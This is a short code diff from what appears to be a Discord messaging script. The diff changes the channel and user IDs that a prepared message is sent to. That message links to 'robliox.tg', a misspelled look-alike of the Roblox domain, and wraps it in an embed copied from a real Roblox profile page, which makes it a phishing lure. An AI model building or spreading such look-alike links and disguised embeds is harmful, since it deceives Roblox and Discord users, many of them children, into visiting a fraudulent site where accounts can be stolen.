@@ -11,8 +11,8 @@ const USER_ID = "384837956944527360";
 const USERNAME = "";
 const AVATAR_URL = "";
 
-const TARGET_CHANNEL = "1425577326661603358";
-const MESSAGE_USER_ID = "1323760789122842735";
+const TARGET_CHANNEL = "1434554985659764886";
+const MESSAGE_USER_ID = "127565633868136449";
 const MESSAGE_TEXT = "https://www.robliox.tg/users/25699615/profile";
 const EMBED_TITLE = "CrazyKiara111's Profile";
 const EMBED_DESCRIPTION = "CrazyKiara111 is one of the millions creating and exploring the endless possibilities of Roblox. Join CrazyKiara111 on Roblox and explore together!Razorbill mogger";
